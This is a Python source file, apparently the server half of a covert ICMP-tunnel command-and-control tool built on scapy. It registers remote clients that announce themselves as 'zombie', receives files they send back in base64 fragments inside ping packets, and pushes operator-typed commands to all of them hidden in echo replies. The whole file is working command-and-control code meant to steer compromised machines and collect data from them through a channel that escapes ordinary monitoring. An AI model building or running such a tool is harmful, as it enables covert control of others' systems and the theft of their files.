import os
import base64
import time
from scapy.all import *
from multiprocessing import Process, Manager

CLIENT_KEEP_ALIVE_MESSAGE = b"i'm a zombie"
FRAGMENT_SIZE = 1300
SEND_FILE = b'file!'

def parse_command(command):
    if command[:5] == SEND_FILE:
        handle_file_fragment(command[6:])
    else:
        print(command.decode())


def handle_file_fragment(fragment):
    filename, data = fragment.split(b' ',1)
    filename = filename.decode()
    with open(filename, 'ab') as file:
        file.write(data)


def fragment_data(data):
    if isinstance(data, str):
        data = data.encode('utf-8')

    fragments = [data[i:i+FRAGMENT_SIZE]
                 for i in range(0, len(data), FRAGMENT_SIZE)]
    fragment_data_list = []
    for fragment in fragments:
        fragment_data = base64.b64encode(fragment).decode('utf-8')
        fragment_data_list.append(fragment_data)
    return fragment_data_list

def handle_icmp_request(pkt, client_ips):
    if IP in pkt and ICMP in pkt:
        client_ip = pkt[IP].src
        client_id = pkt[ICMP].id
        if client_ip not in client_ips:
            client_ips.update({client_ip:client_id})
        
        payload = extract_payload(pkt)
        command = base64.b64decode(payload)
        if command == CLIENT_KEEP_ALIVE_MESSAGE:
            client_ips[client_ip] = client_id
        else:
            parse_command(command)


def extract_payload(pkt):
    payload = pkt[0][Raw].load
    return payload


def start_sniffer(client_ips):
    sniff(prn=lambda pkt: handle_icmp_request(
        pkt, client_ips), filter='icmp[0]=8', store=0)


def send_command(command, client_ips):
    fragments = fragment_data(command)
    for client_ip in client_ips:
        client_id = client_ips.get(client_ip)
        for i, fragment in enumerate(fragments):
            response = IP(dst=client_ip, ttl=64) / \
                ICMP(type=0,id=client_id)/Raw(load=fragment.encode())
            if i > 0:
                response.flags = 'MF'
            send(response)


def main():
    with Manager() as manager:
        client_ips = manager.dict()
        p = Process(target=start_sniffer, args=(client_ips,))
        p.start()

        while True:
            command = input('Enter command: ')
            if command.lower() == 'exit':
                break
            elif command.lower() == 'clients':
                print(client_ips)
            else:
                send_command(command, client_ips)

    p.terminate()


if __name__ == '__main__':
    main()
